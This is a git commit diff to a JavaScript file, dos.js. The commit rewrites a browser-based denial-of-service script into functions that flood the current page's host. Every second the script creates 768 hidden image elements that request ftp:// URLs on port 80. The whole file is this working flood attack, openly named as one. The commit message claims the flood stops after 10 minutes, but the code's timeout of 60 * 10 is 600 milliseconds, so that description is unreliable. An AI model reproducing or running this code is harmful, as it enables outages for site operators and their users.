519f1fcab3dc6b1cf6b6db4e061b930722b08fa0
Christian Nikkanen <christian.nikkanen@gmail.com>
2016-08-20 00:50:10 +0300

    auto kill dos after 10 minutes

--- dos.js
+++ dos.js
@@ -1,6 +1,24 @@
-var domain = window.location.hostname;
-for( i = 0; i < 768; ++i ) {
-  var img = document.createElement('img');
-  img.setAttribute('src', 'ftp://' + domain + ':80/image' + new Date().getTime() + i );
-  document.body.appendChild(img);
+function denialOfService(){
+  var domain = window.location.hostname;
+  var elem = document.createElement("denial");
+  
+  elem.style.display = "none";
+  document.body.appendChild(elem);
+  
+  window.denialOfService = setInterval(function(){
+    for(var i = 0; i < 768; ++i ) {
+      var img = document.createElement('img');
+      img.setAttribute('src', 'ftp://' + domain + ':80/image' + new Date().getTime() + i );
+      elem.appendChild(img);
+    }
+  }, 1000);
+
 }
+
+function stopDenialOfService(){
+  clearInterval(window.denialOfService);
+}
+
+denialOfService();
+setTimeout(stopDenialOfService, 60 * 10);
+
